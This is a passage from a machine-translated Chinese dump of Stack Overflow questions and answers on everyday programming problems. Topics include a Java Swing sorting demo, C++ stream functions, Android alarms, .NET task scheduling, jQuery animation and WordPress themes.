    (new AnimationTester()).go();
}

/**
 * Launches the Sorting animation.
 * Creates a GUI
 */
private void go(){
    JFrame frame = new JFrame("Sort Demo");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    panel = new Panel();
    frame.add(panel, BorderLayout.CENTER);

    frame.setSize(FRAME_WIDTH, FRAME_HEIGHT);

    //    Where the GUI is created:
    JMenuBar menu;
    JMenu sort,num,delay; 

    //      Create the menu bar.
    menu = new JMenuBar();

    //      Build the first menu.
    sort = new JMenu("Algorithm");
    sort.setMnemonic(KeyEvent.VK_A);
    sort.getAccessibleContext().setAccessibleDescription(
                            "Choose an algorithm");

    //      a group of radio button menu items

    JRadioButtonMenuItem bubble = new JRadioButtonMenuItem("Bubble Sort");
    bubble.setActionCommand("bubble");
    JRadioButtonMenuItem merge = new JRadioButtonMenuItem("Merge Sort");
    merge.setActionCommand("merge");
    JRadioButtonMenuItem heap = new JRadioButtonMenuItem("Heap Sort");
    heap.setActionCommand("heap");
    heap.setSelected(true);
    JRadioButtonMenuItem insert = new JRadioButtonMenuItem("Insertion Sort");
    insert.setActionCommand("insert");
    JRadioButtonMenuItem quick = new JRadioButtonMenuItem("Quick Sort");
    quick.setActionCommand("quick");
    JRadioButtonMenuItem shell = new JRadioButtonMenuItem("Shell Sort");
    shell.setActionCommand("shell");
    JRadioButtonMenuItem selection = new JRadioButtonMenuItem("Selection Sort");
    selection.setActionCommand("select");

    //Group the radio buttons.
    ButtonGroup group1 = new ButtonGroup();
    group1.add(bubble);
    group1.add(merge);
    group1.add(heap);
    group1.add(insert);
    group1.add(quick);
    group1.add(shell);
    group1.add(selection);
    sort.add(bubble);
    sort.add(merge);
    sort.add(heap);
    sort.add(insert);
    sort.add(quick);
    sort.add(shell);
    sort.add(selection);

    bubble.addActionListener(this);
    merge.addActionListener(this);
    heap.addActionListener(this);
    insert.addActionListener(this);
    quick.addActionListener(this);
    shell.addActionListener(this);
    selection.addActionListener(this);

    //      Build second menu in the menu bar.
    num = new JMenu("Elements");
    num.setMnemonic(KeyEvent.VK_S);
    num.getAccessibleContext().setAccessibleDescription(
                            "How many elements?");

    //      a group of radio button menu items

    JRadioButtonMenuItem n10 = new JRadioButtonMenuItem("10");
    n10.setActionCommand("10");
    JRadioButtonMenuItem n20 = new JRadioButtonMenuItem("20");
    n20.setActionCommand("20");
    n20.setSelected(true);
    JRadioButtonMenuItem n30 = new JRadioButtonMenuItem("30");
    n30.setActionCommand("30");    
    JRadioButtonMenuItem n50 = new JRadioButtonMenuItem("50");
    n50.setActionCommand("50");
    JRadioButtonMenuItem n100 = new JRadioButtonMenuItem("100");
    n100.setActionCommand("100");

    //Group the radio buttons.
    ButtonGroup group2 = new ButtonGroup();
    group2.add(n10);
    group2.add(n20);
    group2.add(n30);
    group2.add(n50);
    group2.add(n100);
    num.add(n10);
    num.add(n20);
    num.add(n30);
    num.add(n50);
    num.add(n100);

    n10.addActionListener(this);
    n20.addActionListener(this);
    n30.addActionListener(this);
    n50.addActionListener(this);
    n100.addActionListener(this);

    //    Build third menu in the menu bar.

    delay = new JMenu("Speed delay");
    delay.setMnemonic(KeyEvent.VK_S);
    delay.getAccessibleContext().setAccessibleDescription(
                                "How slow?");

    //      a group of radio button menu items

    JRadioButtonMenuItem s0 = new JRadioButtonMenuItem("0");
    s0.setActionCommand("s000");
    JRadioButtonMenuItem s20 = new JRadioButtonMenuItem("20");
    s20.setActionCommand("s020");
    s20.setSelected(true);
    JRadioButtonMenuItem s50 = new JRadioButtonMenuItem("50");
    s50.setActionCommand("s050");
    JRadioButtonMenuItem s100 = new JRadioButtonMenuItem("100");
    s100.setActionCommand("s100");
    JRadioButtonMenuItem s500 = new JRadioButtonMenuItem("500");
    s500.setActionCommand("s500");

    //Group the radio buttons.
    ButtonGroup group3 = new ButtonGroup();
    group3.add(s0);
    group3.add(s20);
    group3.add(s50);
    group3.add(s100);
    group3.add(s500);
    delay.add(s0);
    delay.add(s20);
    delay.add(s50);
    delay.add(s100);
    delay.add(s500);

    s0.addActionListener(this);
    s20.addActionListener(this);
    s50.addActionListener(this);
    s100.addActionListener(this);
    s500.addActionListener(this);

    //add the menus to the Menubar
    menu.add(sort);
    menu.add(num);
    menu.add(delay);

    frame.setJMenuBar(menu);

    frame.setVisible(true);

    startSort();

}

/**
 * Launches a sort.
 * If a sort is already in progress, does nothing.
 *
 */
private void startSort(){
    //do not sort if already busy sorting.
    if(t!=null&&t.isAlive()) return;
    Double[] values = new Double[elements];
    for (int i = 0; i < values.length; i++)
        values[i] = new Double(Math.random() * panel.getHeight()); 
    Runnable r = new Sorter(panel, values, algorithm, delay);
    t=new Thread(r);
    t.start();
}

/**
 * Detects menu commands
 * @param e The event that occured
 */
public synchronized void actionPerformed(ActionEvent e){
    String s=e.getActionCommand();
    if(s=="bubble"||s=="merge"||s=="heap"||
       s=="insert"||s=="quick"||
       s=="shell"||s=="select"){
        algorithm=s;
        startSort();
    }
    if(s=="10"||s=="20"||s=="30"||
       s=="50"||s=="100"){
        elements=Integer.parseInt(s);
        startSort();
    }

    if(s=="s000"||s=="s020"||s=="s050"||
       s=="s100"||s=="s500"){
        delay=Integer.parseInt(s.substring(1,4));
    }

}

//private static final int VALUES_LENGTH = 30;
private static final int FRAME_WIDTH = 400;
private static final int FRAME_HEIGHT = 400;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:50:57.790

嗨，我检查了你的代码，发现你的类中既没有导入 ArrayComponent 也没有导入 Sorter。

即使您已将它们包含在类路径中，直到它们与此类位于同一包中，它们也不会被隐式导入。

使用 import 语句作为

```
import ArrayComponent ;
import Sorter; 
```

那么它必须工作

# c++ - “未格式化的输入函数”究竟是什么意思？

> ID：15738188
> 
> 赞同：2
> 
> 时间：2013-04-01T05:37:10.117
> 
> 标签：c++

在 GameDev.net 上阅读[这篇文章后](http://www.gamedev.net/topic/641136-stdifstreamread-failing-to-read-all-the-bytes/)，我决定看一看 C++ 标准。有几个`std::istream`函数被标准描述为“未格式化的输入函数”（如`tellg()`、`read()`等）。`"\r\n" -> "\n"`一直以来，我一直认为“未格式化的输入函数”意味着在使用“未格式化的输入函数”时（无论是文本模式还是二进制模式），在阅读时（例如，）文本不会被格式化。显然，情况并非如此，因为该`read()`方法仍将转换`"\r\n" -> "\n"`（如果`std::ios_base::binary`未指定），尽管它是“未格式化的输入函数”。

现在我很困惑，因为我显然不理解正确的事情。**“未格式化的输入函数”究竟是什么意思？**是的，我已经阅读了第 27.7.2.3 节第 1 段，它似乎更多地谈论处理错误而不是其他任何内容（当然，我可能没有正确理解它，这可能是问题的一部分）。

我刚刚发现`tellg()`不考虑格式转换的事实`read()`相当混乱。在某种程度上，这是有道理的（`tellg()`如果有的话，O(n) 也是有道理的，如果`read()`没有的话，文本/二进制模式之间的差异将不那么显着）。但在另一个程度上，它似乎……不一致。我认为我的部分困惑和观察到的不一致可能来自我对“未格式化输入函数”的明显误解。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:44:30.117

未格式化的函数意味着该函数将流视为一个序列，`char`即使它是`double`或`int`。例如，如果流有`8.7`，则未格式化的函数`read`会将其读取为 , 的序列，`'8'`并将它们存储在 类型的缓冲区中。`'.'``'7'``char*`

另一方面，格式化函数将尝试将未格式化的缓冲区格式化为给定类型。如果给定的类型是`double`，那么您将得到`8.7`. 如果未格式化的数据无法格式化为给定的类型，该函数会将流状态设置为`failbit`.

# ruby-on-rails-3.1 - 如何将 Rails 项目从 2.3.5 移动到 3.2.11

> ID：15738195
> 
> 赞同：2
> 
> 时间：2013-04-01T05:37:51.677
> 
> 标签：ruby-on-rails-3.1, ruby-on-rails-3.2

我的项目是使用 rails 2.3.5 开发的，现在我们正在考虑将我们的项目转移到 rails 3.2.11

请给我一些关于如何将我们的项目迁移到 3.2.11 的解决方案，并让我们知道我们需要为此做哪些更改

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T13:36:47.910

我目前正在这样做，并决定分步进行，

```
2.3.X -> 3.0.X
3.0.X -> 3.1.X
3.1.X -> 3.2.X 
```

我仍处于第一步，但您也许可以将第 2 步和第 3 步合并到`3.0.X -> 3.2.X`.

`rails_upgrade`第一步，宝石帮助很大。[https://github.com/rails/rails_upgrade](https://github.com/rails/rails_upgrade)

查看有关升级的 RailsCasts。他们真的帮助了我。

**步骤1：**

*   [http://railscasts.com/episodes/225-upgrading-to-rails-3-part-1](http://railscasts.com/episodes/225-upgrading-to-rails-3-part-1)
*   [http://railscasts.com/episodes/226-upgrading-to-rails-3-part-2](http://railscasts.com/episodes/226-upgrading-to-rails-3-part-2)
*   [http://railscasts.com/episodes/227-upgrading-to-rails-3-part-3](http://railscasts.com/episodes/227-upgrading-to-rails-3-part-3)

**第2步：**

*   [http://railscasts.com/episodes/282-upgrading-to-rails-3-1](http://railscasts.com/episodes/282-upgrading-to-rails-3-1)

**第 3 步：**

*   [http://railscasts.com/episodes/318-upgrading-to-rails-3-2](http://railscasts.com/episodes/318-upgrading-to-rails-3-2)

# google-app-engine - GAE中的“身份验证类型”是什么意思

> ID：15738201
> 
> 赞同：1
> 
> 时间：2013-04-01T05:38:43.757
> 
> 标签：google-app-engine

验证什么？访问或管理项目或其他什么？

![在此处输入图像描述](https://i.stack.imgur.com/Ilo9t.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:06:21.323

身份验证类型是用户可以使用他们的 google 帐户或其他提供商登录到您的 web 应用程序的类型。联合登录可能会给您带来问题，例如无法访问数据存储管理员，因此如果您想要更高级的东西，建议使用 google 帐户或[这个项目 engine-auth 。](http://code.scotchmedia.com/engineauth/docs/index.html)

# android - BroadcastReceiver 并不总是被 AlarmManager 触发

> ID：15738205
> 
> 赞同：0
> 
> 时间：2013-04-01T05:39:26.340
> 
> 标签：android, broadcastreceiver, alarmmanager

花了几天时间在这里找到答案，但一无所获。

```
public class myReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
    }
} 
```

活动：

```
public class TestActivity extends Activity {
private myReceiver rec;
    @Override
protected void onCreate(Bundle savedInstanceState) {
        ...
        rec = new myReceiver(); // do I really need this?
        AlarmManager am=(AlarmManager)this.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, myReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, 0);
        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000 * 5 , pi);
    }
} 
```

xml

```
<application ...>
...
<receiver android:name="com.myprj.myReceiver" android:enabled="true"></receiver>
</application> 
```

它并不总是有效，但当“它想要”时:(

注意！：我开始在 Eclipse 中按 Ctrl+F11 并使用后退按钮关闭应用程序，然后再次按 Ctrl-F11！所以，在第 7 次迭代中，应用程序工作（在 onReceive 中祝酒）。我停止了它，删除数据并再次开始按 Ctrl-F11，在第 3 次迭代 - 工作，第 5 次迭代也在工作......它是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:53:49.227

您可以尝试的一些更改（并非所有更改都是必需的）

1.  将 myReceiver 更改为 MyReceiver ( :-) 它是 Java 命名约定）

2.  消除

    `rec = new myReceiver();`

3.  以毫秒为单位给出一些未来时间而不是当前时间

    `am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 5, 1000 * 5 , pi);`

4.  将调试消息放入 onReceive()

    `Log.d("MyReceiver", "onReceive");`

# .net - TaskScheduler 不在主线程上运行任务

> ID：15738208
> 
> 赞同：1
> 
> 时间：2013-04-01T05:39:41.047
> 
> 标签：.net, task-parallel-library

我编写以下代码来尝试使用 TaskScheduler。函数内的任务内容`UpdateStatus`需要在主线程上运行。但我只是得到输出表明它在单独的线程上运行。

关于原因的任何想法？或在主线程上下文中从后台线程写入状态的替代方法。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ConsoleApplication1
{
  class Test
  {
    TaskScheduler scheduler;
    public void Run()
    {
      SynchronizationContext.SetSynchronizationContext(new SynchronizationContext());
      scheduler = TaskScheduler.FromCurrentSynchronizationContext();
      Console.WriteLine("Start on {0}", Thread.CurrentThread.ManagedThreadId);
      Task.Factory.StartNew(() =>
      {
        for (int i = 0; i < 10; i++)
        {
          Console.WriteLine("running on {0}", Thread.CurrentThread.ManagedThreadId);
          UpdateStatus(string.Format("Message {0}", i));
          Thread.Sleep(1000);
        }
      }).ContinueWith(_ =>
      {
        Console.WriteLine("complate");
        Console.WriteLine("running on {0}", Thread.CurrentThread.ManagedThreadId);
      }, new CancellationToken(), TaskContinuationOptions.None, scheduler).Wait();
    }

    private void UpdateStatus(string message)
    {
      Task.Factory.StartNew(() =>
      {
        Console.WriteLine("updating status on {0}", Thread.CurrentThread.ManagedThreadId);
        Console.WriteLine(message);
      }, new CancellationToken(), TaskCreationOptions.None, scheduler);
    }
  }

  class Program
  {
    public static void Main(string[] args)
    {
      var test = new Test();
      test.Run();
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T14:25:45.097

Default SynchronizationContext（您正在使用）不会让您进入主线程。请参阅[为什么 SynchronizationContext 无法正常工作？](https://stackoverflow.com/questions/3892453/why-synchronizationcontext-does-not-work-properly).

正如 svick 所提到的，在您的情况下（控制台应用程序），通常不需要主线程的概念。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T16:31:19.517

你没有解释你到底想做什么，所以很难就最好的行动方案给你建议。

您当前的代码不起作用，因为`SynchronizationContext`您正在创建的代码实际上并没有进行任何同步。（而且你的主线程在`Wait()`调用时也被阻塞了，所以没有其他东西可以在它上面运行。）

您*可以*使用与主线程正确同步的同步上下文（例如[Nito AsyncEx](http://nitoasyncex.codeplex.com/wikipage?title=AsyncContext)中的同步上下文），但我不确定这是否是您的最佳方式。

我认为更好的方法是使用生产者/消费者模式，使用`BlockingCollection`. 您`Task`的 s 将向其中添加项目，您的主线程将从那里获取它们并使用 . 将它们发送到管道`WriteObject()`。

# ios - sound cloud track id url scheme和web

> ID：15738209
> 
> 赞同：0
> 
> 时间：2013-04-01T05:39:41.653
> 
> 标签：ios, web, soundcloud, url-scheme

我有一个推送通知到达我的 iOS 应用程序，该应用程序具有轨道 ID。我能够成功地将声音云应用程序打开到正确的轨道，但如果设备没有安装声音云应用程序，我想在移动 Safari 中打开该轨道。下面是我正在使用的代码：

```
NSString *soundCloudApp = @"soundcloud:tracks:";
NSString *soundCloudUrl = @"https://api.soundcloud.com/tracks";
NSURL *fanPageURL = [NSURL URLWithString:[soundCloudApp stringByAppendingString:data]];
if (![[UIApplication sharedApplication] openURL: fanPageURL]) {
   //fanPageURL failed to open.  Open the website in Safari instead
   NSURL *webURL = [NSURL URLWithString:[soundCloudUrl stringByAppendingString:data]];
   [[UIApplication sharedApplication] openURL: webURL];
} 
```

问题是，如果我使用类似[https://api.soundcloud.com/tracks/my_track_id](https://api.soundcloud.com/tracks/my_track_id)的声音云返回未经授权的访问。如果我尝试[https://soundcloud.com/tracks/my_track_id](https://soundcloud.com/tracks/my_track_id)我找不到页面。任何方式我都可以在 Safari 中打开轨道，只给出轨道 ID？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:06:38.140

也许你应该在你的“if”语句中使用

```
if (![[UIApplication sharedApplication] canOpenURL: fanPageURL])
{
//open safari
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T23:20:05.983

您应该使用`permalink_url`轨道表示的属性。

# python - 如何将非 pdf 网址转换为 .pdf 文件？

> ID：15738214
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:39:54.813
> 
> 标签：python, pdf

类似[http://query.nytimes.com/mem/archive-free/pdf?res=9A00EEDE1431E13BBC4850DFBF66838A649FDE](http://query.nytimes.com/mem/archive-free/pdf?res=9A00EEDE1431E13BBC4850DFBF66838A649FDE)

我可以在 chrome 中打开它并下载为 pdf 文件。我需要将其写入本地 .pdf 文件，但 url 不以 .pdf 结尾 如何将其写入本地文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:45:59.080

```
with open('output.pdf', 'wb') as outfile:
     outfile.write(data) 
```

# asp.net - 使用 IPv6 访问 Web 服务

> ID：15738216
> 
> 赞同：1
> 
> 时间：2013-04-01T05:40:09.287
> 
> 标签：asp.net, windows, networking, windows-server-2008, ipv6

我有一个同时启用 IPv4（通过域控制器解析）和 IPv6 的盒子。是否可以使用 LinkLocal 地址访问 Web 服务（使用 IIS 配置）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:36:59.350

我不知道这是否可能（可能是它），但这非常不方便，因为您每次都必须指定链接标识符。所以你的地址看起来像

```
http://[fe80::1234:abcd%8]/ 
```

而且由于您不能将接口编号或名称放入 DNS 中（无论如何它们都特定于客户端和本地链接），因此用户必须知道接口 ID 并每次都输入地址。

因此，即使可能，它也不是真正可用的。

# facebook - 错误：Safari 无法打开页面，因为地址无效？脸书整合

> ID：15738219
> 
> 赞同：7
> 
> 时间：2013-04-01T05:40:17.160
> 
> 标签：facebook, login, safari, xcode4.6

我正在努力将 fb 登录集成到我们自己的应用程序中。问题是我下载的示例，它工作正常，在我的项目中使用代码时出现错误

**注意：**我检查了 **.plist** 和 url 页面中的 fbapplicationid，它们都是相同的。

![在此处输入图像描述](https://i.stack.imgur.com/5C4q7.jpg)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T07:26:56.750

用户授权应用后。Facebook 请求浏览器启动请求访问的应用程序。该 url 基于 App 的 url 方案（在 App 的 plist 中定义）。所以你需要仔细检查。Safari 显示错误，因为它找不到 url 方案 -> 无效的 URL

它的形式类似于`fb<myAppId>`。之后，对项目进行干净的构建并运行。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-02T04:06:48.243

朋友们，当您尝试 FBlogin 到您的应用程序时，不要忘记检查**.plist**

*在你解释之前必须验证*

**1.FB应用程序ID**

**2.URLSchemas**

# c++ - c++ 指向对象数组的指针适用于 gnu c++ 但不适用于 Visual Studio

> ID：15738222
> 
> 赞同：0
> 
> 时间：2013-04-01T05:40:50.353
> 
> 标签：c++, visual-c++, pointers, g++

我正在尝试使用指向 C++ 中自定义对象数组的指针。以下代码在使用 cygwin 的 gnu 编译器的 eclipse 上编译并运行良好。但是代码在 Visual Studio 中给出了编译错误。

**错误**

```
class 'Levels' has an illegal zero-sized array 
```

在线的

```
Structure *mStructres[]; 
```

**完整代码**

```
/*
 * Levels.h
 */

#include "objects/Structure.h"

#ifndef LEVELS_H_
#define LEVELS_H_

class Levels{

public:

    //other public members

    void reInitialize();
    Levels();
    ~Levels();

private:
    //other private members
    Structure *mStructres[];
};

#endif /* LEVELS_H_ */

/////////////////////////////////////
/*
 * Levels.cpp
 */
#include "Levels.h"

Levels::Levels() {
}

Levels::~Levels() {

}

void Levels::reInitialize() {
    mStructres[size];
                for (int i = 0; i < jStructeresArr.size(); i++) {
                mStructres[i] = new Structure(obj1, obj2,
                            obj3);
                }
} 
```

我尝试将线路更改为

```
Structure *mStructres; 
```

但后来我在重新初始化方法中的这些行出现错误

```
mStructres[size];
            for (int i = 0; i < jStructeresArr.size(); i++) {
            mStructres[i] = new Structure(obj1, obj2,
                        obj3);
            } 
```

我究竟做错了什么？这是跨平台开发的正确方法吗？

**更新** 我不想在这个阶段使用向量或标准模板。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:04:15.533

`Structure *mStructres[];`可能被`Structure **mStructres`其中一个编译器解释为。（编辑：这可能不正确，请参阅评论中的更正）它只是一个指向结构指针的指针。请注意，实际上并没有为其分配任何存储空间（除了单个指针），因此当您为其分配任何内容时，您只是将其写入随机内存。

```
mStructres[size];       // This does nothing, it _could_ cause a crash... 
                        //  but is otherwise the same as the next statement
42;
for (int i = 0; i < jStructeresArr.size(); i++)
    mStructres[i] = new Structure(obj1, obj2, obj3); 
```

我怀疑你想做的只是重新创建你的指针数组。

```
void Levels::reInitialize() {
    for (int i=0; i< jStructeresArr.size(); i++) {
        delete mStructres[i];      // Don't leak memory
        mStructres[i] = new Structure(obj1, obj2, obj3);
    }
} 
```

您的构造函数中还需要以下行。（灵感来自[这里](https://stackoverflow.com/questions/620843/how-do-i-create-an-array-of-pointers)）

```
 mStructres = new Structure*[jStructeresArr.size()]; 
```

如果 jStructeresArr.size() 发生变化，你有很多工作要做。因此，如果有这种可能，我强烈建议您放弃这个，而只使用 std::vector 或 std::list。

# android - 删除广播接收器android中的接近警报

> ID：15738226
> 
> 赞同：2
> 
> 时间：2013-04-01T05:41:26.317
> 
> 标签：android, geofencing, proximitysensor

嗨，我正在开发小型 android 应用程序，我在其中使用接近警报。所以一切正常。现在，一旦触发输入事件，我想做什么，我想删除该警报。怎么做？我可以在广播接收器或其他地方做吗？我的代码看起来像。

```
// in abc class
PendingIntent proximityIntent = PendingIntent.getBroadcast(
                    context, 0, intent,
                    PendingIntent.FLAG_CANCEL_CURRENT);

        locationManager.addProximityAlert(
                latitude, 
                longitude, 
                POINT_RADIUS, 
                PROX_ALERT_EXPIRATION,
                proximityIntent                );

// this is broadcast receiver 
public void onReceive(Context context, Intent intent) {

        String key = LocationManager.KEY_PROXIMITY_ENTERING;

        Boolean entering = intent.getBooleanExtra(key, false);

        if (entering) 
        {
            // here I want to stop this alert... ANy solution how to stop this          
            }
        else
        {
        } 
 } 
```

怎么做？需要帮忙。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:18:00.687

使用位置管理器。删除ProximityAlert(PendingIntent)。只需将它传递给您传递给 addProximityAlert 的意图。如果您现在没有保存，则必须将其保存到 Activity/Service 中的变量中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-16T14:32:20.880

以我的经验，待定意图有一个不同的标志：

```
PendingIntent proximityIntent = PendingIntent
                                            .getBroadcast(
                                                    NotificationService.this,
                                                    0,
                                                    intent,
                                                    PendingIntent.FLAG_ONE_SHOT); 
```

当通知被看到、丢弃或使用时，我得到了这个代码：

```
((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                    .cancel(NOTIFICATION_ID); 
```

在您的代码中，通知 id 将为 0。第一个选项是停止警报，第二个选项是从通知菜单中将其关闭。

# javascript - jquery动画不起作用

> ID：15738227
> 
> 赞同：1
> 
> 时间：2013-04-01T05:41:43.990
> 
> 标签：javascript, jquery, html

嗨，我有一个带有以下代码的简单滑块：

HTML 代码：

```
<div id="gallery">
    <a href="#" id="left-arrow">..</a>
    <a href="#" id="right-arrow">..</a>
    <div id="container">
        <div class="item">...</div>
        <div class="item">...</div>
        ...
        <div class="clr"></div>
    </div>
</div> 
```

CSS 样式：

```
#gallery {
    position:relative;
    width:290px;
    height:200px;
    overflow:hidden;
}
#gallery #container{
    position:absolute;
    left:0px;
    top:0px;
    width:1160px;
}
#right-arrow, #left-arrow{
    width:30px;
    height:30px;
    position:absolute;
    top:85px;
    z-index:200;
}
#right-arrow{
    right:10px;
}
#left-arrow{
    left:10px;
} 
```

JS代码：

```
 <script type="text/javascript">
    $(document).ready(function(){
// I must set left position explicitly if not when fetching left position it returns "auto"
// I used position.left property, however. but It doesn't returns left relative 
// to parent insted (I think) relative to document which (I don't know why? It is not 
// according to Jquery documentation which position.left - .offset() is relative to document)
        $('#container').css('left', '0px'); 
        $('#right-arrow').click(function(){
            move('right');
        });
        $('#left-arrow').click(function(){
            move('left');
        })

        move = function (direction){
                .
                . 
                .
            // The problem is here:
                $('#container').animate(left:'+=290');

                // although setting it's css left position doesnt work
                $('#container').css('left', '290px');

                // I return container to use it in console!
                return $(#container');
        }
    });
    </script> 
```

我使用控制台对其进行调试，我发现它可以正确地将 css 位置设置为我想要的任何位置，但实际上它不起作用看看：

安慰：

```
>>> var x = move()
Object[div#container]

>>> x.css('left', '1000px')
Object[div#container]

>>> x.css('left')
"1000px"
// But It doesn't move in reality 
```

我讨厌 Javascript，请帮助我，我不知道是什么问题

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T05:44:20.910

要使`top`、和css 规则起作用`left`，您需要将css 规则添加到.`bottom``right``position``dom`

```
div
{
   top:10px;
   left:10px;
} 
```

上面的代码不会应用 top 和 left 到 div 但

```
div
{
   top:10px;
   left:10px;
   position : relative;//absolute or fixed or etc
} 
```

上面的代码将起作用。

您有以下错误。

**替换** `return $(#container');` **为** `return $('#container');`

也**替换** `.animate(left:'+=290');` **为** `.animate({left:'+=290'});`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T07:25:33.423

天哪，我发现了问题。问题不在于我的代码。还有另一个元素，另一个地方的 ID`'container'`是在第 3 方模块中，对不起，伙计们是我的错！:D

# php - 自制主题未显示在可用主题选项中

> ID：15738228
> 
> 赞同：0
> 
> 时间：2013-04-01T05:41:48.003
> 
> 标签：php, wordpress, wordpress-theming

我在本地 wordpress 中制作了一个自定义主题。我在文件夹中添加了一个 style.css 和一个 index.php。我还添加了一个图像文件夹。但是我的主题没有出现在可用的主题中！可能的解决方法是什么？请帮忙？

style.css 的前 20 行：

```
/*
Theme Name: test
Theme URI: http://company_name.com
Description: The test theme
Author: sankalp
Author URI: http://company_name.com
Version: 1.0

License:
License URI:

General comments (optional).
*/

    html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video { margin: 0; padding: 0; border: 0; font-size: 100%; font: inherit; vertical-align: baseline; }
    article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section { display: block; }
    body { line-height: 1;}
    ol, ul { list-style: none;}
    blockquote, q { quotes: none;}
    blockquote:before, blockquote:after, q:before, q:after {content: ''; content: none;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T20:13:53.440

要在 WordPress 中显示主题，您应该将主题文件夹上传到`/wp-content/themes/`. 您的主题文件夹应如下所示：

```
/theme-folder/
    style.css
    index.php 
```

您的 style.css 应包括以下几行，如下所述：http: [//codex.wordpress.org/Theme_Development#Theme_Stylesheet](http://codex.wordpress.org/Theme_Development#Theme_Stylesheet)

```
/*
Theme Name: Twenty Ten
Theme URI: http://wordpress.org/
Description: The 2010 default theme for WordPress.
Author: wordpressdotorg
Author URI: http://wordpress.org/
Version: 1.0
Tags: black, blue, white, two-columns, fixed-width, custom-header, custom-background, threaded-comments, sticky-post, translation-ready, microformats, rtl-language-support, editor-style, custom-menu (optional)

License:
License URI:

General comments (optional).
*/ 
```

我通常只包括主题名称、主题 URI、作者和作者 URI，这似乎工作得很好。:)

如果您做了所有这些确保您将主题文件夹上传到正确的网络服务器，那么您可能没有上传您认为上传的位置？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T12:05:27.127

我也试过你的 style.css 文件，很好。确保检查简单的事情，例如，打开正确的开发站点

# extjs - 设置面板 XY 位置时面临的问题

> ID：15738229
> 
> 赞同：2
> 
> 时间：2013-04-01T05:41:55.287
> 
> 标签：extjs

我有一个面板，我在其中添加多个项目（面板）并将每个项目的高度、宽度、xposition、yposition 存储在商店中。

在初始化面板时，使用 store 将项目添加到面板（我在其中添加了项目）。我能够显示我保存的所有项目。但我面临职位问题..

我用作`item.getPosition()[0]`x**位置**和`item.getPosition()[1]`y**位置**。

并在添加项目时使用`item.setPosition( pos.x,pos.y )`. 但我仍然无法将物品放在与我保存的完全相同的位置。

任何帮助将非常感激

感谢和问候网址

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-13T17:28:46.007

几天前我在使用 ExtJS 3.4 时遇到了同样的问题，在对 stackoverflow 和[sencha foruns](https://www.sencha.com/forum/showthread.php?113328-Panel-Positioning-using-setPosition-after-Move-Event.)进行研究后，我发现“默认情况下面板不是绝对定位的，因此无法设置它们的位置。”

但是，您可以使用`floating: true`面板的配置来完成。然后它将表现为一个独立的面板，具有绝对定位。所以你的代码可能会工作。

注意：要禁用`shadow`浮动面板的渲染（默认行为），请`floating: {shadow: false}`改用。

# c++ - 异常继承

> ID：15738238
> 
> 赞同：0
> 
> 时间：2013-04-01T05:42:52.540
> 
> 标签：c++, exception, inheritance

是否可以在 c++ 中的异常类中有多个元素，我可以将它们与异常关联，以便当我抛出它时，用户可以收集有关异常的更多信息而不仅仅是错误消息？我有以下课程

```
#include <list>
using namespace std;

class myex : public out_of_range {
private:
    list<int> *li; 
    const char* str = "";
public:
    //myex(const char* err): out_of_range(err) {}
    myex(li<int> *l,const char* s) : li(l),str(s) {}

    const char* what(){ 
        return str;
    }       
}; 
```

当我使用

```
throw myexception<int>(0,cont,"Invalid dereferencing: The iterator index is out of range.");, 
```

我收到一个错误

```
error: no matching function for call to ‘std::out_of_range::out_of_range()’.
Any help is appreciated.`. 
```

当我取消注释注释行并删除另一个构造函数时，它可以正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:16:06.573

您的用户定义异常的构造函数尝试调用类 out_of_range 的默认构造函数...[除非它不存在](http://cplusplus.com/reference/stdexcept/out_of_range/?kw=out_of_range)！

关于评论的构造函数：

```
myex(const char* err): out_of_range(err) {}
                     //^^^^^^^^^^^^^^^^^ this calls the constructor of 
                     // out_of_range with the parameter err. 
```

为了修复你当前的构造函数，你应该添加一个显式调用 out_of_range 的构造函数（它需要一个 const string&）：

```
